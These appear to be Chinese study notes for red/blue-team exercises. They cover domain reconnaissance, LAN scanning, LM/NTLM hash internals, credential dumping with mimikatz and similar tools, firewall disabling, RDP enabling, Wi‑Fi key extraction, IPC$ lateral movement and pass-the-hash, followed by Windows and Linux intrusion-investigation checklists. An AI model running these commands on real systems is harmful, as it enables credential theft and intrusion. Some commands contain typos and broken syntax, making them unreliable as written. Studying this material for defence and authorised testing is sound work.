- 网关： 192.168.136.2 （默认网关）
- DNS： 192.168.136.10（指向域控主机）

##### 二、Ping 域控，保证通信正常

##### 三、将主机加入域

> 在【计算机名】中修改【域名】为 `hack.com`，点击【确定】，按照要求输入【域管理员账号和密码】

![](/images/hvv/域内加入主机_06_配置网络_02.png)

> 加域成功，按要求重启计算机生效。重启之后的域账户需要修改密码（原始密码默认为空）

![](/images/hvv/域内加入主机_06_配置网络_03.png)

### 本机工作组信息收集

#### 网络配置信息

查看网络配置信息

>  `ipconfig`

#### 操作系统和软件信息

查看系统信息

> `systeminfo`

查看系统名称和版本

> `systeminfo | findstr /B /C:"OS Name"/C:"OS Version"`

查看系统体系结构（32位/64位）

> `echo %PROCESSOR_ARCHITECTURE%`

查看安装的软件及版本

> `wmic product get name, version`



#### 本机服务信息

查看服务列表简述

> `wmic service list brief`



#### 进程信息

查看进程列表

> `tasklist`

或

> `wmic process list brief`



#### 启动程序信息

查看自启程序

> `wmic startup command, caption`



#### 计划任务信息

查看计划任务列表（如果出现“无法载入列资源”，输入： `chcp 437` 更改编码）

`schtasks /query /fo LIST /v`



#### 主机开机时间信息

查看开机时间

> `net statistics workstation`



#### 用户列表信息

查看用户列表

> `net user`

或

>  `wmic useraccount get name, SID`



#### 列出回话

会话列表

> `net session`



#### 查询端口列表

查看端口

> `netstat -ano`



#### 查询补丁列表

查看系统信息（包含补丁列表）

> `systeminfo`

查看补丁列表

> `wmic qfe get Caption, Description, HotFixID, InstalledOn`



#### 查询共享列表

查看共享列表

>  `net share`

或

> `wmic share get name, path, status`



#### 路由信息

查看路由信息

>  `route print `



#### 防火墙相关操作

查看防火墙状态

> `netsh firewall show state`

关闭防火墙

> `netsh firewall set opmode disable`
>
> `netsh advfirewall set allprofiles state off`  （`Windows Server 2003` 之后）

查看防火墙配置

> `netsh firewall config`

修改防火墙配置，允许指定程序进行全部连接

> `netsh firewall add alloweprogram C:\nc.exe "allownc" enable`	（`Windows Server 2003` 之前）
>
> `netsh advfirewall firewall add rule name="passnc" dir=in action=allow program="C:\nc.exe"`	（`Windows Server 2003` 之后）

修改防火墙配置，允许指定程序退出

> `netsh advfirewall firewall add rule name="exitnc" dir=out action=allow program="C:\nc.exe"`

修改防火墙配置，允许 `3389` 端口放行

> `netsh advfirewall firewall add rule name="remoteDesktop" protocol=TCP dir=in localport=3389 action=allow`



#### 开启远程服务

开启远程服务（`Windows Server 2003` ）

> `wmic path win32_terminalservicesetting where (_CLASS != "") call setallowtsconnections 1`

开启远程服务（`Windows Server 2003` 之后）

`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`

关闭远程服务（`Windows Server 2003` 之后）

> `REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnection /t REG_DWORD /d 11111111 /f`



#### Wifi 密码收集

获取 `Wifi` 密码

> `for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key= clear`



#### 查询 RDP 端口

查看 `RDP（远程桌面协议）` 的端口（应对某些修改了远程协议默认端口的场景。默认是 `3389`，对应十六进制 `0xd3d`）

> `reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp" /V PortNumber`



#### 查询 RDP 凭证

> 查询 `RDP` 存活凭证（连接远程主机时如果选择了【保存密码】，就会生成一个凭证）

> `dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*`



#### 查看代理配置信息

查看代理配置信息

> `reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"`



#### 查看当前保存的登录凭证

查看当前保存的登录凭证

> `cmdkey /l`



#### ARP 信息

查看 `ARP` 信息

> `arp -a`



#### 查看最近打开的文档

查看最近打开的文档

> `dir %APPDATA%\Microsoft\Windows\Recent`



#### 查询本机用户组

查询本机用户组

> `net localgroup`



#### 管理员组成员列表

查询管理员组的成员列表（域管理员账号就是本机（域内主机）的 `administrator` 管理员组中的一个账号）

> `net localgroup administrators`



#### 浏览器密码获取

浏览器密码获取

> ``



#### 杀软查询

查看安装的杀毒软件

> `wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list `



### 域内信息收集

#### 查询系统权限

`whoami`

以下以本地计算机名为 `PC-2008`，域名为 `hack.com` 为例

1. 本地普通用户

   `pc-2008\bob`

2. 本地管理员

   `pc-2008\administrator`

3. 域内普通用户

   `hack\bob`

4. 域管理员

   `hack\administrator`

- 如果当前内网中存在域

  - **本地普通账户**只能查询本机相关信息，不能查询域内信息
  - **本地管理员用户**和**域内用户**可以查询域内信息

  > 原因： 域内所有查询都是通过域控制器基于 `LDAP` 协议实现的，这个查询需要权限认证。所以只有域内用户才拥有这个权限，当域内用户在本地机器上执行查询命令时，会自动使用 `Kerberos` 协议进行认证，无须额外的账号密码。

- 本地管理员 `Administrator` 权限可以直接提升为 `Ntauthority` 或 `System`。 因此，在域中，除了普通用户外，所以的机器都有一个机器用户（名称为： `机器名$`）。在本质上，每台机器中的 `system` 用户对应的就是域里面名为`机器名$` 的机器用户，所以使用 `system` 权限是可以运行域内的查询命令的。

- 简单概括： **本地的 `Administrator` 无权执行域内命令，但可以直接提升为 `System` ，而 `System` 有权执行域内命令。**



#### 判断域的存在

**方法一： `ipconfig /all`**

查看网关 IP 地址、DNS 地址、域名。

通过反向解析命令 `nslookup` 解析域名的 IP 地址，判断本机是否和 DNS 服务器在同一网段同一服务器上。



**方法二： `systeminfo`**

查看【域】或者【Domain】对应的内容



**方法三： `net config workstation`**



#### 查询域内基础信息

##### 查询域

前提： 开启 `Workstation` 和 `Computer Browser` 服务，防火墙处于关闭

>  `net view /domain`



##### 查询域内所有计算机

>  `net view /domain:hack`



##### 查询域内所有用户组

>  `net group /domain`

>  常见的自带身份：
>
> - `Domain Admin`s： 域管理员（默认拥有域控制器的完全控制权）
> - `Domain Computers`： 域内机器
> - `Domain Controller`： 域控制器
> - `Domain Guests`： 域访客
> - `Domain Users`： 域用户
> - `Enterprise Admins` 企业级系统管理员（默认拥有域控制器的完全控制权）



##### 查询域内所有成员计算机

>  `net group "domain computers" /domain`



##### 获取域密码信息

获取域密码策略、长度、错误锁定、过期时间等信息

> `net accounts /domain`



##### 获取域信任信息

如果存在域信任关系，可以进行跨域操作

> `nltest /domain_trusts`



#### 查找域控主机

**方法一： 查看域控制器的机器名**

> `nltest /DCLIST:hack`



**方法二： 查看域控制器的主机名**

> `nslookup -type=SRV _ldap._tcp`



**方法三： 查看当前时间**

通常情况下，时间服务器会作为主域控制器

> `net time /domain`



**方法四： 查看域控制器组**

> `net group "Domain Controllers" /domain`



#### 获取域内用户

**方法一： 向域控制器进行查询**

> `net user /domain`



**方法二： 获取域内用户的详细列表**

> `wmic useraccount get/all`



**方法三： 查看存在的用户**

> `dsquery user`



**方法四： 查询本地管理员组用户**

> `net localgroup administrator`



#### 查找域管理员

> `net group "domain admins" /domain`



#### 查找域管理进程





## 内网扫描

### 主机探测

#### NetBIOS 扫描

> `NetBIOS` 是一款用于扫描 `Windows` 网络上 `NetBIOS` 名称信息的程序。该程序对给出范围内的每一个地址发送 `NetBIOS` 状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，`NBTScan` 列出它的 `IP` 地址、`NetBIOS` 计算机名、登录用户名和 `MAC` 地址，但仅限于局域网。`NBTSCAN` 可以获取到 `PC` 的真实 `IP` 地址和 `MAC` 地址，如果有 `ARP` 攻击存在，可以找到装有 `ARP` 攻击的 `PC` 的 `IP` 和 `MAC`，同样也仅限于局域网。

下载地址： `http://www.unixwiz.net/tools/nbtscan.html`

用法： `nbtscan.exe ip`

#### ICMP 探测

> 除了利用 `NetBIOS` 探测之外，也可以利用 `ICMP` 协议探测内网，依次对内网中的每个 `IP` 地址进行 `ping`，快速的找到内网中所有存活主机

探测整个 `C` 段： `for /L %I in (1, 1, 254) Do @ping -w 1 -n 1 192.168.1.%I | findstr "TTL="`



#### ARP 扫描工具探测

`arp -t ip`



#### 端口探测

> 通过查询目标主机的端口开放信息，不进可以了解目标主机所开放的服务，还可以找出其开放服务的漏洞，分析目标网络的拓扑结构等。
>
> 在进行内网渗透时，通常会使用 `metasploit` 内置的端口扫描。也可以上传端口扫描工具，使用工具进行扫描，还可以根据服务器的环境，使用自定义的端口扫描脚本进行扫描。在获得授权的情况下，也可以直接用 `nmap`、 `masscan` 之类的端口扫描工具。



#### ScanLine

> `ScanLine` 是一款 `windows` 下的端口扫描命令程序，它可以完成 `ping` 扫描、 `tcp` 端口扫描、 `udp` 端口扫描等功能。 运行速度快，不需要 `winPcap` 库支持，应用场合受限较少。

`scanline.exe -bhpt 21-23,25,80,110,135-139,143,443,445,1433,1521,3306,2289,5556,5631,5900,8080 192.168.xxx.xxx`

`scanline.exe -bhpt 80,443 192.168.0.1-254`



#### Telnet

> `Telnet` 协议是 `TCP/IP` 协议簇的一员，是 `Internet` 远程登录访问的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在目标计算机上使用 `Telnet` 协议，可以与目标服务器建立连接。如果只是想快速探测某台主机的某个常规高危端口是否开放，使用 `telnet` 命令是最方便的。

`telnet IP PORT`



## LM 和 NTML 哈希

### 哈希介绍

> `Windows` 操作系统通常使用两种方式对用户的明文密码进行加密处理。在域环境中，用户信息存储在 `ntds.dit` 中，加密后为散列值。
>
> `Windows` 操作系统中的密码一般由两部分组成： 一部分为 `LM Hash`， 另一部分为 `NTML Hash`。

> `Windows` 操作系统中，`Hash` 的结构通常如下：
>
> `username:RID:LM-HASH:NT-HASH`

> `LM Hash` 全称： `Lan Manager Hash`。 是微软为了提高 `Windows` 操作系统的安全性而采用的散列加密算法，其本质上是 `DES` 加密。
>
> 后来，由于 `DES` 被认定为不安全算法，`LM Hash` 也变得比较容易破解，但是为了保证系统的兼容性，`Windows` 只是禁用了 `LM Hash` （从 `Windows Vista` 和 `Windows Server 2008` 开始，默认禁用 `LM Hash`）。 `LM Hash` 明文密码被限定在 `14` 位以内，也就是说，如果要停止使用 `LM Hash`， 只需要将密码设置为 `14` 位以上即可。

> 攻击者通过工具抓取到的 `LM Hash` 如果为 `ad3b435b51404eead3b435b51404ee`，通常表示 `LM Hash` 为空值或者被禁用



> `NTLM Hash` 是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。 `NTLM Hash` 是基于 `MD4` 加密算法进行加密的。从 `Windows Vista` 和 `Windows Server 2003` 以后， `Windows` 操作系统的认证方式均为 `NTML Hash`）



### LM Hash 原理

假设明文口令为 `Admin@123`

1. 将明文口令转换成大写形式。

   `ADMIN@123`

2. 将大写字符串转换为 `16` 进制字符串

   十进制： `65 68 77 73 78 64 49 50 51`

   十六进制： `41 44 4D 49 4E 40 31 32 33`

3. 不足 `14` 字节的用 `0` 补全

   `41 44 4D 49 4E 40 31 32 33 00 00 00 00 00`

4. 拆分成 `2` 个 `7` 组

   第一组： `41 44 4D 49 4E 40 31`

   第二组： `32 33 00 00 00 00 00`

5. 将每组 `7` 字节的十六进制转成二进制

   第一组： `0100 0001 0100 0100 0100 1101 0100 1001 0100 1110 0100 0000 0011 0001`

   第二组： `0011 0010 0011 0011 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000`

6. 每组每 `7bit` 一组，末尾加 `0` 补全

   第一组：

   `0100 000` `0`

   `1010 001` `0`

   `0001 001` `0`

   `1010 100` `0` 

   `1001 010` ` 0`

   `0111 001` `0`

   `0000 000` `0`

   `0110 001` `0`

   第二组：

   `0011 001` `0`

   `0001 100` `0`

   `1100 000` `0`

   `0000 000` `0`

   `0000 000` `0`

   `0000 000` `0`

   `0000 000` `0`

   `0000 000` `0`

7. 再转换为十六进制得到 `2` 组 `8` 字节的编码 

   第一组： `40 A2 12 A8 94 72 00 62`

   第二组： `32 18 C0 00 00 00 00 00`

8. 将以上 `2` 组 `8` 字节编码分别作为 `key` 对固定字符串 `KGS!@#$%` 进行 `DES` 加密（固定字符串，也是可以破解的本质原因）

   `KGS!@#$%` 的 `16` 进制为 `4B 47 53 21 40 23 24 25`

   `DES` 加密：

   第一组： `6F 08 F7 B3 06 B1 DA D4`

   第二组： `B7 5E 0C 8D 76 95 4A 50`

9. 拼接得到最终的密文

   `6F08F7B306B1DAD4B75E0C8D76954A50`



### NTLM Hash 原理

假设明文口令为 `Admin@123`

1. 转换成 `16` 进制

   `41 64 6D 69 6E 40 31 32 33`

2. 转换成 `Unicode` 格式

   `4100 6400 6D00 6900 6E00 4000 3100 3200 3300`

3. 对 `Unicode` 字符做 `MD4` 加密（不含空格），得到 `32` 位的十六进制数字串（加密数据类型为 `16进制字串`， 而非普通文本，这里使用 `hashcalc` 进行加密）

   `570a9a65db8fba761c1008a51d4c95ab`



## 密码抓取

> 首先，想要在 `Windows` 操作系统中抓取散列值或者明文密码，必须提权至 `System`。
>
> 本地用户名、散列值和其他安全验证信息都保存在 `SAM` 文件中。
>
> `lsass.exe` 进程用于实现 `Windows` 的安全策略（本地安全策略和登录策略），可以使用工具将散列值和明文密码从内存中的 `lsass.exe` 进程或 `SAM` 文件中导出。
>
> 在 `Windows` 操作系统中，`SAM` 文件的保存位置是 `C:\Windows\System32\config`，该文件是被锁定的，不允许赋值。
>
> 在渗透测试中，可以采用传统方法，在关闭 `Windows` 操作系统后，使用 `FE` 盘进入文件管理环境，直接复制 `SAM` 文件，也可以使用 `VSS` 等方法进行复制。

### GetPass 读取

`./getpass.exe`



### pwdump7 读取

`./pwdump7.exe`



### QuarksPwDump 读取

`quarkspwdump.exe --dump-hash-local`



### mimikztz 读取

`mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"`





## 内网横向

### IPC$ 横向

#### IPC$ 介绍

> `IPC(Internet Process Connection, 网络进程连接)`共享“命名管道”的资源，是为了实现进程之间的通信而开放的命名管道。
>
> `IPC` 可以通过验证用户名和密码获取响应的权限，通常在进程管理计算机和查看计算机的共享资源时使用。

> 通过 `IPC$`	可以与目标机器建立连接，利用这个连接，不仅可以访问目标机器中的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息。

#### 建立 IPC$

`net use \\192.168.xxx.xxx\ipc$ "Admin@123" /user:administrator`

`net use`

#### IPC$ 利用条件

1. 开启 `139`、 ``445` 端口

   `ipcs` 可以实现远程登录及对默认共享资源的访问，`139` 端口的开启表示 `NetBIOS` 协议的应用。通过 `139`、 `445` 端口，可以实现对共享文件打印机的访问。

2. 管理员开启了默认共享

   默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘和系统目录等，通过 `ipc$` 可以实现对这些默认共享目录的访问

#### IPC$ 连接失败的原因

- 用户名或者密码错误
- 目标没有打开 `IPCS` 默认共享
- 不能成功连接目标的 `139`、 `445` 端口

#### IPC$ 连接常见的错误

- `5`： 拒绝访问
- `51`： `Windows` 无法找到网络路径，网络中存在问题
- `53`： 找不到网络路径。包括 `IP` 地址错误、目标未开机、目标的 `lanmanserver` 服务未启动、目标有防火墙对端口过滤等
- `67`： 找不到网络名，包括 `lanmanworkstation` 服务未启动， `ipcs` 已被删除
- `1219`： 提供的凭据与已存在的凭据集冲突。例如，已和目标建立了 `ipcs`，需要在删除原连接后重新连接
- `1326`： 未知的用户名或密码错误
- `1792`： 试图登录但网络登录服务没有启动。包括目标 `NetLogon` 服务未启动等
- `2242`： 此用户密码已经过期。例如： 目标机器设置了账号管理策略，强制用户定期修改密码。

#### 建立 IPC$ 连接后的常用指令

- `dir \\192.168.xxx.xxx\c$`： 列出远程主机 `C` 盘中的文件
- `tasklist [/s system] [/u username] [/p password] IP`： 列出远程主机上运行的进程
- `net time \\IP`： 查看远程主机系统时间
- `copy file \\IP\c$`： 复制远程主机文件
- `schtasks /create /s IP /tn 计划任务名 /sc onstart /tr c:\文件名 /ru system /f`： 创建计划任务
- `schtasks /run /s IP /i /tn 计划任务名`： 执行计划任务
- `schtasks /delete /s IP /tn 计划任务名 /f`： 删除计划任务
- `net use \\IP /del /y`： 清除 `IPC` 连接



### 哈希传递横向

#### PTH 攻击与原理

>  `PTH（Pass The Hash， PTH攻击）`，也叫哈希传递攻击。该方法通过找到与账户相关的密码散列值（通常是 `NTLM Hash`）来进行攻击。在域环境中，用户登录计算机时大都是域账号，而域管理员和本地管理员的账号大概率都是相同的。攻击者就是利用这样的场景，使用哈希传递的方式，登录内网中的其他计算机。而且，通过哈希传递攻击，不需要花费时间破解密码散列值去获取明文。

> 主流的 `Windows` 操作系统，通常会使用 `NTLM Hash` 对访问资源的用户进行身份验证。早期版本的 `Windows` 操作系统则使用 `LMHash` 对用户密码进行验证。但是，当密码大于 `15` 位时，就无法使用 `LM Hash` 了。从 `Windows vista` 和 `Windows server 2008` 版本开始， `Windows` 操作系统默认禁用 `LM Hash`， 因为在使用 `NTLM Hash` 进行身份认证时，不会使用明文口令，而是将明文口令通过系统 `API` 转换成散列值。不过，攻击者在获得密码散列值之后，依旧可以使用哈希传递攻击来模拟用户进行认证。



#### PTH 传递攻击

`mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:hack.com /ntlm:xxxxxxxxxxxxx"`





### 票据传递横向

 





## 入侵检测

### Windows 系统入侵排查

#### 检查系统账号安全

1. 服务器登录弱口令检查
2. 服务器远程登录桌面协议端口开放检查
    - 查看 `RDP` 协议端口（防止 `RDP` 端口被修改过，默认 3389）
    - 检查 `RDP` 协议端口是否开放
3. 服务器账号检查
    - `lusrmgr.msc` 检查是否有新增可疑账号
    - 注册表检查是否存在隐藏账号
    - 注册表检查是否存在克隆账号
    - 扫描工具（如： D盾_web）检查是否存在可疑账号

#### 检查异常端口、进程

1. 检查端口连接情况
    - `netstat -ano` 查看网络连接，定位可疑 `ESTABLISHED`
    - 根据上一步定位出的 `pid`，通过 `tasklist | findstr "PID"` 命令进行进程定位
    - 检查 `0.0.0.0` 地址的绑定
    - 检查已开放的端口是否已经做过公司内部备案（通信矩阵）
2. 检查进程
    - 运行 `msinfo32`，依次点击【软件环境】【正在运行任务】查看进程的详细信息
    - 扫描工具（如： D盾_web、 Process Explorer）查看进程，关注没有签名信息的进程
    - 可疑进程主要关注：
        - 没有签名验证信息的进程
        - 没有描述信息的进程
        - 进程属主
        - 进程的路径
        - CPU 或内存资源占用长时间过高的进程

#### 检查启动项、计划任务、服务

1. 检查启动项
    - 检查【启动】目录下是否有非业务程序
    - `msconfig` 检查是否存在可疑启动项，如有，取消勾选并前往所处路径下删除源文件
    - `gpedit.msc` 组策略下检查是否存在可疑启动项
    - `regedit` 检查注册表下是否存在可疑启动项，主要关注以下：
        - `HKEY_CURRENT_USER\Software\Micorsoft\Windows\CurrentVersion\Run`
        - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
        - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce`
2. 检查计划任务
    - 检查【控制面板】【计划任务】中是否存在可疑文件
    - `at` 或 `schtasks.exe` 检查计算机与网络其他计算机之间的会话或计划任务是否存在异常
3. 检查服务
    - `services.msc` 检查是否存在异常服务（关注【状态】和【启动类型】）
    - 留意隐藏服务

#### 检查系统相关信息

1. 查看系统版本以及补丁信息
    - 运行 `systeminfo` 查看系统信息
2. 查看可疑目录及文件
    - 用户目录（`C:\Documents and Settings\` 或 `C:\Users\`）
    - 运行 `%USERPROFILE%\Recent` 查看最近文件
    - 手动分析各目录下文件（夹）最近操作时间

#### 检查系统日志

默认位置：`%SystemRoot%\System32\Winevt\Logs\System.evtx` 或者右键【计算机】【管理】【事件管理器】


1. 应用程序日志


2. 系统日志
    > **系统日志**记录操作系统组件产生的事件。主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由 `Windows NT/2000` 操作系统预先定义
    
3. 安全日志
    > **安全日志**记录操作系统的安全审计事件。主要包括各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、账号管理、策略变更、系统事件等。安全日志也是调查取证中最常用的日志。默认情况下，安全日志是关闭的，管理员可以使用组策略来启动安全日志，或者在注册表中设置审核策略。

    常见的事件 ID：
    - 4624： 登录成功
    - 4625： 登录失败
    - 4634： 注销成功
    - 4647： 用户启动的注销
    - 4672： 超级用户登录
    - 4720： 创建用户

    常见的登录类型：
    - 2： 交互式登录。用户在本地登录
    - 3： 网络登录。例如： 连接到共享文件或共享打印机
    - 4： 批处理。例如： 计划任务启动
    - 5： 服务。每种服务都被配置在某个特定账号下运行的
    - 7： 解锁。屏幕解锁
    - 8： 网络明文。登录密码在网络上明文传输，如： FTP 登录
    - 9： 新凭证。使用带 `/Netonly` 参数的 `RUNAS` 命令运行一个程序
    - 10： 远程交互。通过终端服务、远程桌面协议等登录
    - 11： 缓存交互。通常是以一个域用户登录而又没有域控制器的情况下

#### 日志分析

### Linux 系统入侵排查

#### 账号安全
1. 用户信息文件
    - `etc/passwd`
2. 影子文件
    - `/etc/shadow`
3. 其他常用的组合命令：
    - 查询特权用户： `awk -F: '$3==0{print $1}' /etc/passwd`
    - 查询可以远程登录的账号： `awk '/\$1|\$6/{print $1}' /etc/shadow`
    - 查询拥有 `sudo` 权限的账号： `more /etc/sudoerss|grep -v "^#\|^$"|grep "ALL=(ALL)"`
    - 禁用账号： `usermod -L user` 被禁用后，账号无法登录，`/etc/shadow` 文件中对应的账户第二类会以 `!` 开头
    - 删除账号： `userdel user`
    - 删除账号并清空用户目录： `userdel -r user` 用户目录就是 `/home/user` 目录
    - 查看当前登录用户： `who` （`tty`： 本地登录； `pts`： 远程登录）
    - 查看系统信息： `w` （参考判断某时刻用户的行为，登录方式、登录地址、时间等）
    - 查看登录时间： `uptime`

#### 历史命令

在用户根目录下： 
- `cd /home/user`
- `cat .bash_history`

#### 检查异常端口

1. 查看端口信息
    - `netstat -anptl|more`
2. 查看 `pid` 对应的进程文件
- `ls -l /proc/$PID/exe` 或 `file /proc/$PID/exe`

#### 检查异常进程

- `ps -aux | grep $PID`

#### 检查开机启动项

1. 查看系统运行级别
    - `runlevel`

    运行级别划分如下：
    - 0： 关机
    - 1： 单用户模式。类似于 `Windows` 的安全模式，常用于系统修复
    - 2： 不完全的命令行模式，不含 `NFS` 服务
    - 3： 完全的命令行模式，标准字符界面
    - 4： 系统保留
    - 5： 图形化界面模式
    - 6： 重启动

#### 检查定时任务

1. 检查定时任务
    - `crontab -l`
    - 查看定时任务保存的文件（重点关注以下目录， 使用 `more` 可以查看目录下所有文件）： 
        - `/var/spool/cron/*`
        - `/etc/crontab`
        - `/etc/cron.d/*`
        - `/etc/cron.daily/*`
        - `/etc/cron.hourly/*`
        - `/etc/cron.monthly/*`
        - `/etc/cron.weekly/*`
    
2. `anacron` 实现的异步定时任务调度
    - 使用案例：
        - 每天运行 `/home/backup.sh` 脚本： `vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh`
    - 查看异步定时任务调度
        - `/etc/anacrontab`
        - `/var/spool/anacrontab`

#### 检查服务

1. 方法一：
    - `chkconfig [--level 运行级别][独立服务名][on|off]` 默认级别是： `2345`
    - 例： `chkconfig httpd on`

2. 方法二：
    - 修改 `/etc/rc.d/rc.local` 文件
    - 加入 `/etc/init.d/httpd start`

3. 方法三：
    - `ntsysv` 命令管理自启动，可以管理独立服务和 `xinetd` 服务

#### 检查异常文件



#### 检查系统日志

1. 定位有多少个 IP 在爆破主机的 root 账号
    - 爆破的 IP 信息： `grep "Failed password form root" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more`
    - 爆破的 IP 地址： `grep "Failed password from root" /var/log/secure | grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"|uniq -c`
    - 爆破的用户名字典： `grep "Failed password" /var/log/secure|prel -e 'while($_=<>){/for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr`

2. 登录成功的 IP
    - `grep "Accepted" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more`

3. 登录成功的日期、用户名、IP：
    - `grep "Accepted" /var/log/secure | awk '{print $1,$2,$3,$9,$11}'`

常见的日志文件：
- `/var/log/cron`： 记录了系统定时任务相关的日志
- `/var/log/cups`： 记录打印信息的日志
- `/var/log/dmesg`： 记录了系统在开机时内核自检的信息
- `/var/log/maillog`： 记录右键信息
- `/var/log/message`： 记录系统重要信息的日志。系统出现问题时，首先要检查的就应该是这个日志。
- `/var/log/btmp`： 记录错误登录日志。是个二进制文件，要用 `lastb` 命令查看
- `/var/log/lastlog`： 记录系统中所有用户最后一次登录时间。是个二进制文件，要用 `lastlog` 命令查看
- `/var/log/wtmp`： 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。是个二进制文件，要用 `last` 命令查看
- `/var/log/utmp`： 记录当前已经登录的用户信息，会随着用户的登录和注销不断变化，只记录当前登录的用户信息。是个二进制文件，要用 `w`、 `who`、 `users` 等命令查看
- `/var/log/secure`： 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录。比如 `SSH` 登录、 `su` 切换用户、 `sudo` 授权、 添加删除用户等。



## 常见安全设备

### 态势感知

### 终端防护

### 蜜罐设备

### 沙箱平台

### 威胁情报平台

### EDR 设备



## 其他

### HW 工作注意事项

### 日报编写规范

### 简历编写思路

### 面试回答技巧

### 面试经验分享